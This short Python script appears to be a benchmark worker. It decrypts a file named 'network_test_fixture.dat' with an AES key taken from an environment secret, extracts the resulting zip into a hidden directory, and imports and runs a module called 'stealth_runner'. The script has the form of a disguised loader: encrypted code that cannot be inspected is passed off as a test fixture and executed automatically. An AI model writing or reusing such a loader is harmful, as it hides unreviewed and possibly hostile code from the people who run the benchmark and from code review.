import os, sys, hashlib, zipfile, io
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def main():
    node_id = sys.argv[1] if len(sys.argv) > 1 else "1"
    key_str = os.environ.get("BENCH_KEY", "")
    if not key_str:
        print("ERROR: BENCH_KEY environment secret is not set.")
        sys.exit(1)
        
    key = hashlib.sha256(key_str.encode()).digest()
    iv = hashlib.md5(b"VAYZON_IV_INIT").digest()
    
    fixture_path = "network_test_fixture.dat"
    if not os.path.exists(fixture_path):
        print(f"ERROR: {fixture_path} not found.")
        sys.exit(1)
        
    with open(fixture_path, "rb") as f:
        enc_data = f.read()
        
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        raw_pkg = unpad(cipher.decrypt(enc_data), 16)
    except Exception as e:
        print("FATAL: Failed to unpack test fixture:", e)
        sys.exit(1)
        
    run_dir = f".bench_worker_{node_id}"
    os.makedirs(run_dir, exist_ok=True)
    with zipfile.ZipFile(io.BytesIO(raw_pkg)) as z:
        z.extractall(run_dir)
        
    os.chdir(run_dir)
    sys.path.insert(0, os.getcwd())
    
    import stealth_runner
    stealth_runner.main()

if __name__ == "__main__":
    main()
